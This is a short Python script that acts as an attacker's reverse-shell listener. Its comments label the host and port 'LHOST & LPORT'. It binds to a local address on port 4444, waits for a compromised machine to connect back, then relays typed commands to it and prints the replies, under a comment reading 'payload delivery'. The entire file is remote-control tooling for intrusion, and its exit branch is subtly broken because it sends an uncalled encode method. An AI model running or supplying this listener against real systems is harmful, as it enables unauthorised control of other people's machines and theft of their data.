from socket import *
# LHOST & LPORT
HOST = "192.168.18.16"
PORT = 4444
#connection configuration
connection = socket(AF_INET, SOCK_STREAM)
connection.bind((HOST, PORT))
# listen and receive the connection
connection.listen(1)
client, addr = connection.accept()
print("connection -> " + str(addr))
#payload delivery
while True:
    receiver = client.recv(1024).decode()
    print(receiver)
    cmd = input("-> ")
    if cmd == "exit":
        client.send(cmd.encode)
    elif cmd == "" or cmd == None:
        cmd = "----"
        client.send(cmd.encode())
    else:
        client.send(cmd.encode())